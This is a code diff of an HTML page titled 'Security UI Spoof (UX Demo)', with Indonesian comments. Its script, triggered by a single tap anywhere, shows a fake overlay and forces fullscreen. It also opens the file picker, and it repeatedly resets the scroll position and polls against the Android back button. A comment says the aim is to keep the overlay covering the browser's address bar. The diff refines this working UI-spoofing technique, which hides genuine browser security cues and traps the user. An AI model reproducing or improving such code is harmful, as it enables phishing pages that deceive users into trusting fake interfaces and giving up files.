@@ -5,18 +5,19 @@
   <title>Security UI Spoof (UX Demo)</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
   <style>
-    body {
+    html, body {
       margin: 0;
       padding: 0;
+      width: 100vw;
+      height: 100vh; /* fix viewport */
+      overflow: hidden; /* prevent scroll */
       background: #111;
       color: #fff;
       font-family: sans-serif;
-      height: 200vh;
       display: flex;
       justify-content: center;
       align-items: center;
       flex-direction: column;
-      overflow-x: hidden;
     }
 
     #spoof {
@@ -33,6 +34,7 @@
 
     #content {
       text-align: center;
+      z-index: 1;
     }
 
     input[type=file] {
@@ -54,41 +56,34 @@ const filePicker = document.getElementById('filePicker');
 const spoof = document.getElementById('spoof');
 const content = document.getElementById('content');
 
-// Scroll instan ke atas
 function forceScrollTop() {
   window.scrollTo(0, 0);
-  document.body.scrollTop = 0;   // untuk beberapa device
+  document.body.scrollTop = 0;
   document.documentElement.scrollTop = 0;
 }
 
-// Klik awal
+// TAP ANYWHERE: langsung overlay, fullscreen, file picker
 document.addEventListener('click', async () => {
-  // 1️⃣ overlay
   spoof.style.display = 'block';
   content.style.display = 'none';
 
-  // 2️⃣ fullscreen
+  // fullscreen
   if (document.documentElement.requestFullscreen) {
     try { await document.documentElement.requestFullscreen(); } catch(e) {}
   }
 
-  // 3️⃣ trigger file picker
+  // trigger file picker
   filePicker.click();
-
-  // paksa scroll ke atas beberapa kali
-  setTimeout(forceScrollTop, 50);
-  setTimeout(forceScrollTop, 200);
 }, { once: true });
 
-// fullscreen change
+// keluar fullscreen: paksa scroll top agar overlay tetap nutupi omnibar
 document.addEventListener('fullscreenchange', () => {
   if (!document.fullscreenElement) {
-    // keluar fullscreen, scroll instan ke atas
     forceScrollTop();
   }
 });
 
-// Polling untuk Android back button
+// polling tambahan untuk tombol back Android
 setInterval(() => {
   if (!document.fullscreenElement) {
     forceScrollTop();
